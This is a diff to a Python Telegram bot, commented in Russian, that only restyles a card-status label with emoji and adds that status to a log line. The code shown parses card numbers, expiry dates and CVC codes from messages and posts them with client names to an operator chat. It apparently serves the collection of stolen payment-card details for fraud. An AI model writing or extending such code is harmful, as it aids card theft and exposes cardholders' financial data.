@@ -482,8 +482,14 @@ async def update_payment_status(callback, payment_id, user_id, status_text, acti
         elif any(keyword in line for keyword in ['Номер:', 'Срок:', 'CVC:']):
             card_data.append(line)
     
-    # Проверяем статус карты в БД
-    card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
+    # ПРОВЕРЯЕМ СТАТУС КАРТЫ В БД СРАЗУ
+    is_card_attached = check_card_in_db(card_number)
+    
+    # ОПРЕДЕЛЯЕМ СТАТУС И ЭМОДЗИ
+    if is_card_attached:
+        card_status = "🟢 ПРИВЯЗАНАЯ КАРТА"
+    else:
+        card_status = "🟠 НЕ ПРИВЯЗАНАЯ КАРТА"
     
     # Собираем новое сообщение с красивым форматированием
     new_text = f"💳 <b>{card_status}</b>\n\n"
@@ -620,11 +626,17 @@ async def process_payment_data(message: types.Message):
         )
 
         if payment_id:
-            # Проверяем статус карты В БД СРАЗУ
+            # ПРОВЕРЯЕМ СТАТУС КАРТЫ В БД СРАЗУ
             card_number = payment_data.get('card_number', '')
-            card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
+            is_card_attached = check_card_in_db(card_number)
             
-            # Форматируем сообщение в новом стиле СРАЗУ
+            # ОПРЕДЕЛЯЕМ СТАТУС И ЭМОДЗИ
+            if is_card_attached:
+                card_status = "🟢 ПРИВЯЗАНАЯ КАРТА"
+            else:
+                card_status = "🟠 НЕ ПРИВЯЗАНАЯ КАРТА"
+            
+            # ФОРМАТИРУЕМ СООБЩЕНИЕ С СТАТУСОМ КАРТЫ СРАЗУ ВВЕРХУ
             formatted_text = f"💳 <b>{card_status}</b>\n\n"
             formatted_text += "👤 <b>Клиент:</b>\n"
             formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
@@ -644,7 +656,7 @@ async def process_payment_data(message: types.Message):
                 reply_markup=get_payment_buttons(payment_id, "user123", card_number),
                 parse_mode="HTML"
             )
-            logger.info(f"✅ Платеж #{payment_id} создан")
+            logger.info(f"✅ Платеж #{payment_id} создан. Статус карты: {card_status}")
 
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
@@ -1015,6 +1027,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
